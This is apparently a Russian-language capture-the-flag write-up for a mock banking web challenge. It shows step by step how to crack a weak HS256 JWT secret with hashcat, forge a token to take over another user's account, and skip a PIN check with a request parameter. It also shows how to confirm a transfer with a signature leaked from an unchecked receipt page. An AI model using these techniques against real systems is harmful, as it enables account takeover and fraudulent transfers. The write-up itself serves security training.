##Описание

К нам пришёл наш золотой клиент — Михаил Галанков. Говорит, со

счёта ушёл перевод, которого он не делал. Мы разбираемся уже

вторую неделю и, честно говоря, не понимаем как: у нас на каждом

платеже одноразовая криптоподпись, а перед списанием банк ещё и

PIN спрашивает. Михаил клянётся, что ни PIN, ни подпись никому

не диктовал, и мы ему верим — он сам по специальности безопасник.

Чтобы вы могли спокойно покопаться, мы подняли отдельный тестовый

сегмент — это полная копия нашего банка, только с тестовыми

деньгами и горсткой пользователей внутри (мы и сами туда обычно

загоняем человек десять, не больше). Логин Михаила там тот же —

mgalankov@4274. Пароль от его учётки админ, к сожалению, в тикет

вписать забыл, но вы же опытные.

**Категория:** Web · JWT · IDOR

## Что сказано в условии

## Шаг 1. Регистрируемся как самый обычный клиент

Идём на `/register`, заполняем что угодно:

- Имя/Фамилия — любые (требуется кириллица).
- Дата рождения — лишь бы 18+.
- Водительское удостоверение — любые цифры.
- E-mail — любой уникальный.
- Пароль — любой ≥6 символов.
- PIN — 8 цифр.

Жмём «Зарегистрироваться», запоминаем сгенерированный логин (что-то типа `ppoc@4710`).

Логинимся и сразу включаем **Burp** в режиме перехвата.

---

## Шаг 2. Достаём JWT из cookie

В Burp смотрим любой ответ от сервера после логина. В `Set-Cookie` лежит:

```
Set-Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5...; HttpOnly; Path=/
```

Копируем значение, идём на **<https://jwt.io>**, вставляем в поле слева. Справа видим:

```json
{
  "fresh": false,
  "iat": 1745030000,
  "jti": "....",
  "type": "access",
  "sub": "13",
  "nbf": 1745030000,
  "exp": 1745033600,
  "username": "ppoc@4710"
}
```

Алгоритм — **HS256**. То что нужно для офлайн-брута.

---

## Шаг 3. Брутим секрет JWT по `rockyou`

Сохраняем токен целиком в файл `jwt.txt`. Запускаем hashcat:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Через несколько секунд:

```
eyJhbGciOiJIUz...:facetoface
```

Секрет — `facetoface`. Это словарное слово, лежит прямо в `rockyou`.

> Альтернатива без hashcat — `jwt_tool.py <jwt> -C -d rockyou.txt`, или GUI-шный `jwt-cracker`.

---

## Шаг 4. Подделываем JWT под `mgalankov@4274`

Возвращаемся на **[jwt.io](http://jwt.io)**:

1. В левое поле вставляем свой текущий токен.
2. Снизу в **VERIFY SIGNATURE** в поле «secret» вписываем `facetoface`, видим зелёное «Signature Verified».
3. В правом payload-окне меняем:
   - `"sub": "13"` → `"sub": "10"`
   - `"username": "ppoc@4710"` → `"username": "mgalankov@4274"`
   - при желании — отодвигаем `exp` подальше.
4. Слева мгновенно пересчитывается новый токен.

Копируем новый JWT целиком.

В Burp в любой запрос (например, `GET /dashboard`) делаем **Right Click → Send to Repeater**, в шапке заменяем cookie:

```
Cookie: access_token_cookie=<новый_подделанный_JWT>
```

Жмём **Send**. В ответе видим страницу дашборда mgalankov-а: баланс `1 500 000 ₽`, история его реальных переводов. Поздравляю — мы внутри аккаунта золотого партнёра.

С этой минуты в браузере проще всего работать через **Match & Replace** в Burp Proxy (Settings → Match & Replace → добавить правило для cookie), тогда подделанный JWT будет уезжать сам в каждом запросе.

## Шаг 5. Берём токен покупки в Telegram-боте

В условии указан бот вида `@capy_capy_bot`. В Telegram:

1. Открываем диалог с ботом → **Start**.
2. Пишем команду `/token`.
3. Бот отвечает строкой токена (примерно такая: `t_8a3f...`). Копируем.

## Шаг 6. Заходим в магазин и инициируем покупку

В браузере (с подменённым cookie) идём `/partners` → ссылка на «Магазин флагов». Видим список товаров.

Жмём «Купить» на первом флаге, на следующей странице вставляем токен из бота. Сервер открывает форму перевода с заполненными полями `to_account=FLAG_SHOP`, `amount=1000.00`, `description=Покупка...` и требует ввести PIN.

PIN-а у mgalankov-а мы не знаем (он 12-значный, не брутится за разумное время). Но снизу на форме есть кнопка **«Отказаться от PIN»**. Жмём её.

Перехватываем этот запрос в Burp — он выглядит так:

```http
POST /transfer HTTP/1.1
Host: target
Cookie: access_token_cookie=<подделанный JWT>
Content-Type: application/x-www-form-urlencoded

skip_pin=1&to_account=FLAG_SHOP&amount=1000.00&description=Покупка%3A+...&product_id=1&token=t_8a3f...
```

Отправляем, сервер редиректит на `/pending_transactions`. На этой странице у нас появляется новая запись «Покупка...» в статусе «не подтверждено». Запоминаем её **id** (он есть в URL ссылки `/verify_transaction/<id>` — например, `12`).

---

## Шаг 7. Тут и срабатывает дыра — `/receipt/<id>` без проверки `is_verified`

Открываем чек неподтверждённой транзакции прямо в браузере:

```
http://target/receipt/12
```

Сервер должен был бы написать «чек ещё недоступен» — но он спокойно отдаёт страницу чека с полем **Подпись транзакции**. Пример:

```
Подпись транзакции: ab3f4e91cc2d7a55
```

Это валидная подпись для **уже созданной** транзакции `id=12`. Сервер сгенерировал её при `skip_pin=1` и положил в БД заранее, хотя транзакция ещё в статусе «pending». Вот это и есть утечка / IDOR-подобная логическая ошибка.

Копируем `ab3f4e91cc2d7a55`.

---

## Шаг 8. Подтверждаем транзакцию подсмотренной подписью

Идём `GET /verify_transaction/12` (или жмём ссылку «подтвердить» на странице pending). Откроется форма ввода подписи — вставляем `ab3f4e91cc2d7a55` и сабмитим.

В Burp видим:

```http
POST /verify_transaction/12 HTTP/1.1
Cookie: access_token_cookie=<подделанный JWT>

signature=ab3f4e91cc2d7a55
```

Сервер сравнивает подпись с пересчитанной из `signature_timestamp` — совпадает, выставляет `is_verified=True`, дёргает Telegram-бота `/api/approve_purchase`. Бот шлёт нам **флаг в личку**.

В UI банка появляется зелёный баннер «Транзакция подтверждена успешно! Флаг отправлен в Telegram бот.» — идём в TG, забираем флаг.

---

## Кратко — почему это работает

1. JWT-секрет — словарный (`facetoface` из rockyou), HS256, ломается за секунды.
2. На странице чека `/receipt/<id>` нет проверки `is_verified` — подпись неподтверждённой транзакции утекает.
3. В ветке `skip_pin=1` сервер заранее кладёт в БД валидную подпись, хотя должен был бы оставить пустое поле или сгенерировать только при фактическом подтверждении.
